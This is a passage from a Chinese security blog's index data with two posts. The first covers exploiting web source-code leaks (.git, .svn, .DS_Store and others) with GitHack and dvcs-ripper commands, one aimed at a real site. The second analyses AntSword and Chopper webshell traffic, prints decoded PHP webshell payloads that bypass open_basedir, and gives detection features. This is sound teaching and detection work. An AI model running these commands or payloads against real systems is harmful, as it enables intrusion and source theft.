href=\"https://bbs.zkaq.cn/t/4557.html\">https://bbs.zkaq.cn/t/4557.html</a></p>\n","categories":["web安全学习"],"tags":["CTF","web","安全"]},{"title":"常见web源码泄露漏洞","url":"/2022/08/30/%E5%B8%B8%E8%A7%81web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","content":"<h3 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h3><ul>\n<li><a href=\"#web1\">Git源码泄露</a></li>\n<li><a href=\"#web2\">hg源码泄露</a></li>\n<li><a href=\"#web3\">SVN源码泄露</a></li>\n<li><a href=\"#web4\">CVS泄露</a></li>\n<li><a href=\"#web5\">Bazaar&#x2F;bzr泄露</a></li>\n<li><a href=\"#web6\">WEB-INF&#x2F;web.xml泄露</a></li>\n<li><a href=\"#web7\">备份文件泄露</a></li>\n<li><a href=\"#web8\">DS_Store文件泄露</a></li>\n<li><a href=\"#web9\">SWP文件泄露</a></li>\n<li><a href=\"#web10\">Github源码泄露</a></li>\n</ul>\n<h3 id=\"Git源码泄露\"><a href=\"#Git源码泄露\" class=\"headerlink\" title=\"Git源码泄露\"></a>Git源码泄露</h3><p>（1）<strong>Git源码泄露原因</strong>：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p>\n<p>（2）<strong>git的目录结构</strong>：</p>\n<ul>\n<li><p>工作区：也就是我们建立的git目录</p>\n</li>\n<li><p>版本库（Repository）：工作区目录下git默认的隐藏目录</p>\n<pre><code>*   版本库--暂存区：add后文件的存放位置\n</code></pre>\n<ul>\n<li>版本库–分支：commit后文件的存放位置</li>\n</ul>\n</li>\n</ul>\n<p>（3）<strong>一般来说，一个git仓库还存在这两个文件</strong>：</p>\n<ol>\n<li>README.md（项目介绍）</li>\n<li>.gitignore (配置在git进行文件跟踪的时候忽略掉哪些文件 , 从这个文件一般也可以得到一部分网站的目录结构 , 或者一些日志&#x2F;配置文件等敏感文件**)**</li>\n</ol>\n<p>（4）<strong>确定是否泄露</strong></p>\n<p>使用<code>dirsearch</code>工具扫描后台，如果存在则会扫描出<code>.git</code>目录，也可以直接通过网页访问.git目录，如果能访问就说明存在</p>\n<p>（5）<strong>漏洞利用</strong>：</p>\n<p>1.使用GitHack工具</p>\n<p>是一个.git泄露利用的脚本，通过泄露的.git文件夹下的文件，还原重建工程源代码。</p>\n<p>GitHub下载地址：<code>https://github.com/lijiejie/GitHack</code></p>\n<p>2.使用dvcs-ripper</p>\n<pre><code>rip-git.pl -v -u http://www.example.com/.git/`&lt;/pre&gt;\n\n（6）**命令**：\n&lt;pre class=&quot;wp-block-code&quot;&gt;`python GitHack.py http://www.xxx.com/.git/`&lt;/pre&gt;\n\n（7）**漏洞修复**：\n</code></pre>\n<ul>\n<li>对.git目录的访问权限进行控制</li>\n<li>在每次pull到web目录下之后删除.git文件夹</li>\n</ul>\n<h3 id=\"hg源码泄露\"><a href=\"#hg源码泄露\" class=\"headerlink\" title=\"hg源码泄露\"></a>hg源码泄露</h3><p>（1）<strong>介绍</strong>：<code>hg init</code>的时候会生成.hg</p>\n<p>（2）<strong>利用工具</strong>：dvcs-ripper</p>\n<p>（3）<strong>下载地址</strong>：<code>https://github.com/kost/dvcs-ripper</code></p>\n<p>（4）<strong>命令</strong>：<br><code>rip-hg.pl -v -u http://www.example.com/.hg/</code></p>\n<h3 id=\"SVN源码泄露\"><a href=\"#SVN源码泄露\" class=\"headerlink\" title=\"SVN源码泄露\"></a>SVN源码泄露</h3><p>（1）<strong>介绍</strong>：SVN是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，可以利用.svn&#x2F;entries文件，获取到服务器源码。</p>\n<p>（2）<strong>利用工具</strong>：dvcs-ripper</p>\n<p>（3）<strong>命令</strong>：<br><code>rip-svn.pl -v -u http://www.example.com/.svn/</code></p>\n<p>（4）<strong>修复建议</strong>：删除web目录中所有.svn隐藏文件夹，开发人员在使用SVN时，严格使用导出功能，禁止直接复制代码。</p>\n<h3 id=\"CVS泄露\"><a href=\"#CVS泄露\" class=\"headerlink\" title=\"CVS泄露\"></a>CVS泄露</h3><p> （1）<strong>介绍</strong>：CVS是一个C&#x2F;S系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS&#x2F;Root以及CVS&#x2F;Entries目录，直接就可以看到泄露的信息。<br><code>http://url/CVS/Root 返回根信息http://url/CVS/Entries 返回所有文件的结构</code></p>\n<p>（2）<strong>利用工具</strong>：dvcs-ripper</p>\n<p>（3）<strong>用法</strong>：<br><code>rip-cvs.pl -v -u http://www.example.com/CVS/</code></p>\n<h3 id=\"Bazaar-x2F-bzr泄露\"><a href=\"#Bazaar-x2F-bzr泄露\" class=\"headerlink\" title=\"Bazaar&#x2F;bzr泄露\"></a>Bazaar&#x2F;bzr泄露</h3><p>（1）<strong>介绍</strong>：bzr也是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面。</p>\n<p>（2）<strong>用法</strong>：<br><code>rip-bzr.pl -v -u http://www.example.com/.bzr/</code></p>\n<h3 id=\"WEB-INF-x2F-web-xml泄露\"><a href=\"#WEB-INF-x2F-web-xml泄露\" class=\"headerlink\" title=\"WEB-INF&#x2F;web.xml泄露\"></a>WEB-INF&#x2F;web.xml泄露</h3><p>（1）<strong>介绍</strong>：WEB-INF是Java的WEB应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>\n<p>（2）<strong>一些web容器的特性</strong>：</p>\n<p>Tomcat的WEB-INF目录，每个j2ee的web应用部署文件默认包含这个目录。<br>Nginx在映射静态文件时，把WEB-INF目录映射进去，而又没有做Nginx的相关安全配置（或Nginx自身一些缺陷影响）。从而导致通过Nginx访问到Tomcat的WEB-INF目录（请注意这里，是通过Nginx，而不是Tomcat访问到的，因为上面已经说到，Tomcat是禁止访问这个目录的）。</p>\n<p>（3）<strong>漏洞成因</strong>：在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>\n<p>（4）<strong>WEB-INF主要包含的文件</strong>：</p>\n<ul>\n<li>WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 <strong>servlet</strong>和其他的应用组件配置及命名规则。</li>\n<li>WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。</li>\n<li>WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。</li>\n<li>WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</li>\n<li>WEB-INF&#x2F;database.properties：数据库配置文件。</li>\n</ul>\n<p>（5）<strong>利用方式</strong>：在域名后面加上WEB-INF&#x2F;web.xml，然后通过web.xml文件推断出class文件的路径，最后得到class文件之后可以进行反编译，然后就可以得到java文件源码。</p>\n<h3 id=\"备份文件泄露\"><a href=\"#备份文件泄露\" class=\"headerlink\" title=\"备份文件泄露\"></a>备份文件泄露</h3><p>（1）<strong>形成原因</strong>：</p>\n<ol>\n<li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li>\n<li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li>\n</ol>\n<p>（2）<strong>备份文件下载</strong>：index.php.bak</p>\n<p>（3）<strong>常见的网站源码备份文件后缀</strong>：</p>\n<ul>\n<li>tar</li>\n<li>tar.gz</li>\n<li>zip</li>\n<li>rar</li>\n</ul>\n<p>（4）<strong>常见的网站源码备份文件名</strong>：</p>\n<ul>\n<li>web</li>\n<li>website</li>\n<li>backup</li>\n<li>back</li>\n<li>www</li>\n<li>wwwroot</li>\n<li>temp</li>\n</ul>\n<h3 id=\"DS-Store文件泄露\"><a href=\"#DS-Store文件泄露\" class=\"headerlink\" title=\"DS_Store文件泄露\"></a>DS_Store文件泄露</h3><p>（1）<strong>介绍</strong>：​ .DS_Store是Mac下Finder用来保存如何展示 文件&#x2F;文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_Store上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p>\n<p>（2）<strong>形成原因</strong>：在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p>\n<p>（2）<strong>利用工具下载地址</strong>：<code>https://github.com/lijiejie/ds_store_exp</code></p>\n<p>（3）<strong>命令</strong>：<br><code>python ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store</code></p>\n<h3 id=\"SWP文件泄露\"><a href=\"#SWP文件泄露\" class=\"headerlink\" title=\"SWP文件泄露\"></a>SWP文件泄露</h3><p>（1）<strong>介绍</strong>：swp即swap文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp。</p>\n<p>（2）<strong>利用</strong>：直接访问.swp文件，下载回来后就可以得到源码文件。</p>\n<h3 id=\"Github源码泄露\"><a href=\"#Github源码泄露\" class=\"headerlink\" title=\"Github源码泄露\"></a>Github源码泄露</h3><p>（1）<strong>介绍</strong>：GitHub是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。</p>\n<p>参考链接：</p>\n<ul>\n<li><a href=\"https://blog.csdn.net/fengzheng126/article/details/122771040\">https://blog.csdn.net/fengzheng126/article/details/122771040</a></li>\n<li><a href=\"https://www.modb.pro/db/394012\">https://www.modb.pro/db/394012</a></li>\n</ul>\n<p>如果文章有何不妥之处，请您指出。</p>\n","categories":["web安全学习"],"tags":["CTF","web","安全"]},{"title":"常见webshell管理工具流量分析","url":"/2023/06/17/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","content":"<h2 id=\"蚁剑流量分析\"><a href=\"#蚁剑流量分析\" class=\"headerlink\" title=\"蚁剑流量分析\"></a>蚁剑流量分析</h2><ul>\n<li>靶机：192.168.117.230</li>\n<li>攻击机：192.168.117.1</li>\n</ul>\n<p>使用wireshark进行抓包，这里选择虚拟机的网卡</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617182519006.png\" alt=\"image-20230617182519006\"></p>\n<p>先查看木马是否正常</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617182612506.png\" alt=\"image-20230617182612506\"></p>\n<p>然后打开蚁剑，准备连接木马</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617182700593.png\" alt=\"image-20230617182700593\"></p>\n<p>先不要进行连接，先开启抓包，然后再进行连接。</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617182952367.png\" alt=\"image-20230617182952367\"></p>\n<p>然后可以进行新建文件、查看文件、编辑文件等操作。</p>\n<p>然后断开连接，再停止抓包</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617183115723.png\" alt=\"image-20230617183115723\"></p>\n<p>将流量包保存。然后在过滤器里面过滤http请求</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617184811185.png\" alt=\"image-20230617184811185\"></p>\n<p>然后追踪流</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617184826120.png\" alt=\"image-20230617184826120\"></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617184929554.png\" alt=\"image-20230617184929554\"></p>\n<p>将cmd（这是你的连接密码）后面的内容进行url解码，这里是第一次http请求</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">@<span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&quot;display_errors&quot;</span>, <span class=\"string\">&quot;0&quot;</span>);@<span class=\"title function_ invoke__\">set_time_limit</span>(<span class=\"number\">0</span>);<span class=\"variable\">$opdir</span>=@<span class=\"title function_ invoke__\">ini_get</span>(<span class=\"string\">&quot;open_basedir&quot;</span>);<span class=\"keyword\">if</span>(<span class=\"variable\">$opdir</span>) &#123;<span class=\"variable\">$ocwd</span>=<span class=\"title function_ invoke__\">dirname</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&quot;SCRIPT_FILENAME&quot;</span>]);<span class=\"variable\">$oparr</span>=<span class=\"title function_ invoke__\">preg_split</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"string\">&quot;Lzt8Oi8=&quot;</span>),<span class=\"variable\">$opdir</span>);@<span class=\"title function_ invoke__\">array_push</span>(<span class=\"variable\">$oparr</span>,<span class=\"variable\">$ocwd</span>,<span class=\"title function_ invoke__\">sys_get_temp_dir</span>());<span class=\"keyword\">foreach</span>(<span class=\"variable\">$oparr</span> <span class=\"keyword\">as</span> <span class=\"variable\">$item</span>) &#123;<span class=\"keyword\">if</span>(!@<span class=\"title function_ invoke__\">is_writable</span>(<span class=\"variable\">$item</span>))&#123;<span class=\"keyword\">continue</span>;&#125;;<span class=\"variable\">$tmdir</span>=<span class=\"variable\">$item</span>.<span class=\"string\">&quot;/.e46c7297&quot;</span>;@<span class=\"title function_ invoke__\">mkdir</span>(<span class=\"variable\">$tmdir</span>);<span class=\"keyword\">if</span>(!@<span class=\"title function_ invoke__\">file_exists</span>(<span class=\"variable\">$tmdir</span>))&#123;<span class=\"keyword\">continue</span>;&#125;<span class=\"variable\">$tmdir</span>=<span class=\"title function_ invoke__\">realpath</span>(<span class=\"variable\">$tmdir</span>);@<span class=\"title function_ invoke__\">chdir</span>(<span class=\"variable\">$tmdir</span>);@<span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&quot;open_basedir&quot;</span>, <span class=\"string\">&quot;..&quot;</span>);<span class=\"variable\">$cntarr</span>=@<span class=\"title function_ invoke__\">preg_split</span>(<span class=\"string\">&quot;/\\\\\\\\|\\//&quot;</span>,<span class=\"variable\">$tmdir</span>);<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">sizeof</span>(<span class=\"variable\">$cntarr</span>);<span class=\"variable\">$i</span>++)&#123;@<span class=\"title function_ invoke__\">chdir</span>(<span class=\"string\">&quot;..&quot;</span>);&#125;;@<span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&quot;open_basedir&quot;</span>,<span class=\"string\">&quot;/&quot;</span>);@<span class=\"title function_ invoke__\">rmdir</span>(<span class=\"variable\">$tmdir</span>);<span class=\"keyword\">break</span>;&#125;;&#125;;;<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">asenc</span>(<span class=\"params\"><span class=\"variable\">$out</span></span>)</span>&#123;<span class=\"keyword\">return</span> <span class=\"variable\">$out</span>;&#125;;<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">asoutput</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"variable\">$output</span>=<span class=\"title function_ invoke__\">ob_get_contents</span>();<span class=\"title function_ invoke__\">ob_end_clean</span>();<span class=\"keyword\">echo</span> <span class=\"string\">&quot;d40&quot;</span>.<span class=\"string\">&quot;a61&quot;</span>;<span class=\"keyword\">echo</span> @<span class=\"title function_ invoke__\">asenc</span>(<span class=\"variable\">$output</span>);<span class=\"keyword\">echo</span> <span class=\"string\">&quot;25284&quot;</span>.<span class=\"string\">&quot;0a6b1&quot;</span>;&#125;<span class=\"title function_ invoke__\">ob_start</span>();<span class=\"keyword\">try</span>&#123;<span class=\"variable\">$D</span>=<span class=\"title function_ invoke__\">dirname</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&quot;SCRIPT_FILENAME&quot;</span>]);<span class=\"keyword\">if</span>(<span class=\"variable\">$D</span>==<span class=\"string\">&quot;&quot;</span>)<span class=\"variable\">$D</span>=<span class=\"title function_ invoke__\">dirname</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&quot;PATH_TRANSLATED&quot;</span>]);<span class=\"variable\">$R</span>=<span class=\"string\">&quot;<span class=\"subst\">&#123;$D&#125;</span>\t&quot;</span>;<span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$D</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>)!=<span class=\"string\">&quot;/&quot;</span>)&#123;<span class=\"keyword\">foreach</span>(<span class=\"title function_ invoke__\">range</span>(<span class=\"string\">&quot;C&quot;</span>,<span class=\"string\">&quot;Z&quot;</span>)<span class=\"keyword\">as</span> <span class=\"variable\">$L</span>)<span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">is_dir</span>(<span class=\"string\">&quot;<span class=\"subst\">&#123;$L&#125;</span>:&quot;</span>))<span class=\"variable\">$R</span>.=<span class=\"string\">&quot;<span class=\"subst\">&#123;$L&#125;</span>:&quot;</span>;&#125;<span class=\"keyword\">else</span>&#123;<span class=\"variable\">$R</span>.=<span class=\"string\">&quot;/&quot;</span>;&#125;<span class=\"variable\">$R</span>.=<span class=\"string\">&quot;\t&quot;</span>;<span class=\"variable\">$u</span>=(<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&quot;posix_getegid&quot;</span>))?@<span class=\"title function_ invoke__\">posix_getpwuid</span>(@<span class=\"title function_ invoke__\">posix_geteuid</span>()):<span class=\"string\">&quot;&quot;</span>;<span class=\"variable\">$s</span>=(<span class=\"variable\">$u</span>)?<span class=\"variable\">$u</span>[<span class=\"string\">&quot;name&quot;</span>]:@<span class=\"title function_ invoke__\">get_current_user</span>();<span class=\"variable\">$R</span>.=<span class=\"title function_ invoke__\">php_uname</span>();<span class=\"variable\">$R</span>.=<span class=\"string\">&quot;\t<span class=\"subst\">&#123;$s&#125;</span>&quot;</span>;<span class=\"keyword\">echo</span> <span class=\"variable\">$R</span>;;&#125;<span class=\"keyword\">catch</span>(<span class=\"built_in\">Exception</span> <span class=\"variable\">$e</span>)&#123;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;ERROR://&quot;</span>.<span class=\"variable\">$e</span>-&gt;<span class=\"title function_ invoke__\">getMessage</span>();&#125;;<span class=\"title function_ invoke__\">asoutput</span>();<span class=\"keyword\">die</span>();</span><br></pre></td></tr></table></figure>\n\n<p>下面这段几乎是所有webshell客户端连接PHP类webshell都有的一种代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">@<span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&quot;display_errors&quot;</span>, <span class=\"string\">&quot;0&quot;</span>);@<span class=\"title function_ invoke__\">set_time_limit</span>(<span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\n\n<p>第二次http请求，直接将0修改为1</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617185021954.png\" alt=\"image-20230617185021954\"></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617185102536.png\" alt=\"image-20230617185102536\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">2uL3Zhci93d3cvaHRtbC8=&amp;cmd=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir=@ini_get(&quot;open_basedir&quot;);if($opdir) &#123;$ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$oparr=preg_split(base64_decode(&quot;Lzt8Oi8=&quot;),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) &#123;if(!@is_writable($item))&#123;continue;&#125;;$tmdir=$item.&quot;/.04cc128be0&quot;;@mkdir($tmdir);if(!@file_exists($tmdir))&#123;continue;&#125;$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);$cntarr=@preg_split(&quot;/\\\\\\\\|\\//&quot;,$tmdir);for($i=0;$i&lt;sizeof($cntarr);$i++)&#123;@chdir(&quot;..&quot;);&#125;;@ini_set(&quot;open_basedir&quot;,&quot;/&quot;);@rmdir($tmdir);break;&#125;;&#125;;;function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;8a222&quot;.&quot;3d050&quot;;echo @asenc($output);echo &quot;b0ad05&quot;.&quot;234b6c&quot;;&#125;ob_start();try&#123;$D=base64_decode(substr($_POST[&quot;c46bdd40d38eda&quot;],2));$F=@opendir($D);if($F==NULL)&#123;echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);&#125;else&#123;$M=NULL;$L=NULL;while($N=@readdir($F))&#123;$P=$D.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot;\t&quot;.$T.&quot;\t&quot;.@filesize($P).&quot;\t&quot;.$E.&quot;</span><br><span class=\"line\">&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;&#125;echo $M.$L;@closedir($F);&#125;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();</span><br></pre></td></tr></table></figure>\n\n<p>这里总结蚁剑的几个特征：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 蚁剑的流量会有两次请求</span><br><span class=\"line\">2. 请求的主题会经过URL编码</span><br><span class=\"line\">3. 存在ini_set(&#x27;display_errors&#x27;,&#x27;0&#x27;)字符特征码</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"菜刀流量分析\"><a href=\"#菜刀流量分析\" class=\"headerlink\" title=\"菜刀流量分析\"></a>菜刀流量分析</h2><p>抓包还是跟上面一样，这里只是使用菜刀。</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617190342116.png\" alt=\"image-20230617190342116\"></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617190427491.png\" alt=\"image-20230617190427491\"></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617190438668.png\" alt=\"image-20230617190438668\"></p>\n<p>然后下面进行分析，一样过滤http，并且追踪流</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617190557710.png\" alt=\"image-20230617190557710\"></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617190616805.png\" alt=\"image-20230617190616805\"></p>\n<p>可以发现这里只会有一次请求，所以跟蚁剑还是有所区别的。</p>\n<p>然后我们还可以发现，结果会有一个特征：<code>X@Y 结果 X@Y</code></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617190740989.png\" alt=\"image-20230617190740989\"></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617190758050.png\" alt=\"image-20230617190758050\"></p>\n<p>然后我们再次查看流量，发现其请求头是百度的请求头</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617190843888.png\" alt=\"image-20230617190843888\"></p>\n<p>其请求体的内容默认是base64编码</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617190919039.png\" alt=\"image-20230617190919039\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">@<span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&quot;display_errors&quot;</span>,<span class=\"string\">&quot;0&quot;</span>);@<span class=\"title function_ invoke__\">set_time_limit</span>(<span class=\"number\">0</span>);<span class=\"keyword\">if</span>(PHP_VERSION&lt;<span class=\"string\">&#x27;5.3.0&#x27;</span>)&#123;@<span class=\"title function_ invoke__\">set_magic_quotes_runtime</span>(<span class=\"number\">0</span>);&#125;;<span class=\"keyword\">echo</span>(<span class=\"string\">&quot;X@Y&quot;</span>);<span class=\"variable\">$D</span>=<span class=\"title function_ invoke__\">dirname</span>(<span class=\"keyword\">__FILE__</span>);<span class=\"variable\">$R</span>=<span class=\"string\">&quot;<span class=\"subst\">&#123;$D&#125;</span>\\t&quot;</span>;<span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$D</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>)!=<span class=\"string\">&quot;/&quot;</span>)&#123;<span class=\"keyword\">foreach</span>(<span class=\"title function_ invoke__\">range</span>(<span class=\"string\">&quot;A&quot;</span>,<span class=\"string\">&quot;Z&quot;</span>) <span class=\"keyword\">as</span> <span class=\"variable\">$L</span>)<span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">is_dir</span>(<span class=\"string\">&quot;<span class=\"subst\">&#123;$L&#125;</span>:&quot;</span>))<span class=\"variable\">$R</span>.=<span class=\"string\">&quot;<span class=\"subst\">&#123;$L&#125;</span>:&quot;</span>;&#125;<span class=\"variable\">$R</span>.=<span class=\"string\">&quot;\\t&quot;</span>;<span class=\"variable\">$u</span>=(<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;posix_getegid&#x27;</span>))?@<span class=\"title function_ invoke__\">posix_getpwuid</span>(@<span class=\"title function_ invoke__\">posix_geteuid</span>()):<span class=\"string\">&#x27;&#x27;</span>;<span class=\"variable\">$usr</span>=(<span class=\"variable\">$u</span>)?<span class=\"variable\">$u</span>[<span class=\"string\">&#x27;name&#x27;</span>]:@<span class=\"title function_ invoke__\">get_current_user</span>();<span class=\"variable\">$R</span>.=<span class=\"title function_ invoke__\">php_uname</span>();<span class=\"variable\">$R</span>.=<span class=\"string\">&quot;(<span class=\"subst\">&#123;$usr&#125;</span>)&quot;</span>;<span class=\"keyword\">print</span> <span class=\"variable\">$R</span>;;<span class=\"keyword\">echo</span>(<span class=\"string\">&quot;X@Y&quot;</span>);<span class=\"keyword\">die</span>();</span><br></pre></td></tr></table></figure>\n\n<p>请求体中还存在eval，assert等函数</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20230617191039337.png\" alt=\"image-20230617191039337\"></p>\n<p>所以菜刀的流量分析总结如下：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 请求体中含有eval、assert等函数</span><br><span class=\"line\">2. 请求头默认为百度的请求头</span><br><span class=\"line\">3. 请求的payload为base64编码</span><br><span class=\"line\">4. 请求体中的执行结果为明文，其结果被X@Y包裹</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"哥斯拉v4-0-流量分析\"><a href=\"#哥斯拉v4-0-流量分析\" class=\"headerlink\" title=\"哥斯拉v4.0 流量分析\"></a>哥斯拉v4.0 流量分析</h2><p><img 